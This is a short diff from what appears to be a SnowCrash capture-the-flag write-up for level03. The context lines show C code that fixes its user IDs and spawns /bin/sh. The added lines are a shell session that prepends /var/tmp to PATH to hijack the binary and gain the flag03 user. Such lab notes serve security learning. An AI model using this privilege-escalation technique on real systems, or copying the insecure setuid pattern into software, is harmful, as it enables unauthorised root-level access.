@@ -16,3 +16,8 @@ int main(void) {
     setresuid(geteuid(), geteuid(), geteuid());
     system("/bin/sh");
 }
+
+level03@SnowCrash:~$ PATH=/var/tmp:$PATH ./level03
+uid=3003(flag03) gid=2003(level03) groups=3003(flag03),100(users),2003(level03)
+
+level03@SnowCrash:~$ /var/tmp/suflag
